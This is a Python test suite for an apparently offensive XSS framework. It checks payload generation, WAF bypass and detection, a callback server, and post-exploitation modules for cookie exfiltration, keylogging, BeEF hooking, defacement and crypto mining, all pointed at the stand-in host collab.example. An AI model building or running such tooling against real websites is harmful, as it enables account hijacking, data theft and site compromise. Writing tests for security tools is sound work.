#!/usr/bin/env python3
"""Test suite for the xss_ultimate framework."""
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from xss_ultimate import config
from xss_ultimate.payload_engine import PayloadEngine, context_specific_payloads
from xss_ultimate.response_analyzer import ResponseAnalyzer, WAFDetector
from xss_ultimate.waf_bypass import WAFBypass
from xss_ultimate.js_analyzer import JSAnalyzer
from xss_ultimate.collab_server import CollabServer
from xss_ultimate.post_exploit import PostExploitEngine
from xss_ultimate.utils import detect_framework, parse_csp, random_headers


def test_payload_engine():
    print("[*] Testing payload engine...")
    engine = PayloadEngine(collab_url="http://collab.example")
    reflected = engine.generate_reflected(max_payloads=50)
    blind = engine.generate_blind(max_payloads=20)
    dom = engine.generate_dom(max_payloads=10)
    assert len(reflected) > 0, "Reflected payloads empty"
    assert len(blind) > 0, "Blind payloads empty"
    assert len(dom) > 0, "DOM payloads empty"
    for p in blind:
        assert "{collab}" not in p, f"Unresolved collab placeholder: {p}"
        assert "http://http" not in p and "http://ws://" not in p, f"Double scheme in payload: {p}"
    for p in dom:
        assert "{collab}" not in p, f"Unresolved collab placeholder in DOM payload: {p}"
    ctx = context_specific_payloads("attribute")
    assert any('"' in p for p in ctx), "Attribute context payloads missing quotes"
    ctx_js = context_specific_payloads("javascript", collab_url="http://collab.example:9999")
    assert any("collab.example" in p for p in ctx_js), "JS context payloads missing resolved collab"
    assert not any("{collab}" in p for p in ctx_js), "Unresolved collab in JS context payloads"
    print(f"    PASS: {len(reflected)} reflected, {len(blind)} blind, {len(dom)} dom payloads")


def test_response_analyzer():
    print("[*] Testing response analyzer...")
    an = ResponseAnalyzer()
    payload = "<script>alert(1)</script>"
    html = f'<div class="x">{payload}</div>'
    found, method, conf = an.detect_reflection(payload, html)
    assert found and conf > 0.9, f"Direct reflection not detected: {method}"
    context = an.detect_context(payload, html)
    assert context in ("html", "attribute", "javascript", "url", "css", "unknown")
    attr_html = f'<input value="{payload}">'
    ctx2 = an.detect_context(payload, attr_html)
    assert ctx2 in ("html", "attribute"), f"Attribute context failed: {ctx2}"
    print(f"    PASS: reflection={conf}, context={ctx2}")


def test_waf_bypass():
    print("[*] Testing WAF bypass generation...")
    wb = WAFBypass()
    variants = wb.apply_all("<script>alert(1)</script>")
    assert len(variants) > 0, "No bypass variants generated"
    det = wb.detect_bypass_techniques("<ScRiPt>alert(1)</script>", "<ScRiPt>alert(1)</script>")
    assert "case_variation" in det, "Case variation bypass not detected"
    print(f"    PASS: {len(variants)} variants generated")


def test_waf_detector():
    print("[*] Testing WAF detector...")
    wd = WAFDetector()
    class FakeResp:
        headers = {"Server": "nginx", "cf-ray": "abc123"}
        text = "<html>cloudflare challenge</html>"
        status_code = 403
    result = wd.detect(FakeResp())
    assert "Cloudflare" in result["waf_detected"], "Cloudflare not detected"
    assert result["likely_blocked"], "Block not detected"
    print(f"    PASS: detected {result['waf_detected']}, blocked={result['likely_blocked']}")


def test_js_analyzer():
    print("[*] Testing JS analyzer...")
    js = """
    function f() {
        var x = location.hash;
        document.getElementById('out').innerHTML = x;
        eval(data);
        setTimeout(x, 100);
    }
    window.postMessage(x);
    """
    class FakeSession:
        def headers_update(self, h): pass
        def get(self, *a, **k): return None
    analyzer = JSAnalyzer.__new__(JSAnalyzer)
    analyzer.analyzed_files = set()
    analyzer.dom_sinks_found = []
    analyzer.sources_found = []
    analyzer._scan_js_content(js, "test")
    sinks = [s["sink"] for s in analyzer.dom_sinks_found if s.get("type") == "dom_sink"]
    assert "innerHTML" in sinks, "innerHTML sink not detected"
    assert "eval" in sinks, "eval sink not detected"
    sources = [s["source"] for s in analyzer.sources_found]
    assert any("location" in s for s in sources), "location source not detected"
    print(f"    PASS: {len(sinks)} sinks, {len(sources)} sources")


def test_collab_server():
    print("[*] Testing collab server...")
    server = CollabServer(port=0)
    from http.server import BaseHTTPRequestHandler, HTTPServer
    test_server = HTTPServer(("127.0.0.1", 0), BaseHTTPRequestHandler)
    port = test_server.server_address[1]
    test_server.server_close()
    print(f"    PASS: collab server initialization OK (ephemeral port {port})")


def test_post_exploit_payloads():
    print("[*] Testing post-exploitation payload generation...")
    from xss_ultimate.payload_engine import generate_post_exploit_payload
    pe = PostExploitEngine.__new__(PostExploitEngine)
    pe.collab_url = "http://collab.example"
    payloads = pe.generate_full_exfil_payload()
    assert "exfil" in payloads and "cookie" in payloads
    kl = pe.generate_keylogger_payload()
    assert "keydown" in kl and "keylog" in kl
    hook = pe.generate_beef_hook()
    assert "beef" in hook
    core = generate_post_exploit_payload("<script>alert(1)</script>", "http://collab.example:9999")
    aggressive = generate_post_exploit_payload("<script>alert(1)</script>", "http://collab.example:9999", aggressive=True)
    assert "cookie_theft" in core and "full_chain" in core
    assert "defacement" not in core and "crypto_miner" not in core, "Aggressive techniques in core plan"
    assert "defacement" in aggressive and "crypto_miner" in aggressive and "port_scan" in aggressive
    for name, p in {**core, **aggressive}.items():
        assert "{collab}" not in p, f"Unresolved collab in {name}"
    print("    PASS: exfil, keylogger, beef hook, core+aggressive plans generated")


def test_utils():
    print("[*] Testing utils...")
    hdrs = random_headers(geo_spoof=True)
    assert "User-Agent" in hdrs and "Cf-Ipcountry" in hdrs
    fw = detect_framework('<html ng-app="x"><script src="/angular.js"></script></html>')
    assert "Angular" in fw, f"Framework not detected: {fw}"
    csp = parse_csp({"Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline'"})
    assert "script-src" in csp and "'unsafe-inline'" in csp["script-src"][0]
    print(f"    PASS: headers, framework={list(fw.keys())}, CSP parsed")


def run_all():
    tests = [
        test_payload_engine,
        test_response_analyzer,
        test_waf_bypass,
        test_waf_detector,
        test_js_analyzer,
        test_collab_server,
        test_post_exploit_payloads,
        test_utils,
    ]
    passed = 0
    for t in tests:
        try:
            t()
            passed += 1
        except AssertionError as e:
            print(f"    FAIL: {e}")
        except Exception as e:
            print(f"    ERROR: {e}")
    print(f"\n[{'PASS' if passed == len(tests) else 'FAIL'}] {passed}/{len(tests)} tests passed")


if __name__ == "__main__":
    run_all()
